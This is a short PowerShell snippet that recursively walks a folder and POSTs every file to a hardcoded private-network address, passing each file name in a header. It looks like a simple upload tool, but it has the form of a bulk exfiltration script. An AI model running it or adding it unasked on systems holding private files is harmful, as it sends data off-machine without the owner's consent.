# HTTP/s server URL
$url = "http://192.168.250.146"

# Iterate over each file in the folder and its subdirectories
Get-ChildItem -Path $folderPath -File -Recurse | ForEach-Object {
    # File name
    $fileName = $_.Name
    
    # Full file path
    $filePath = $_.FullName
    
    # Request configuration
    $headers = @{
        "X-File-Name" = $fileName
    }

    # Send the file to the server
    $response = Invoke-WebRequest -Uri $url -Method Post -Headers $headers -InFile $filePath -UseBasicParsing

    # Show server response
    $response
    
    # Wait for 1 second before sending the next file
    Start-Sleep -Seconds 0.5
}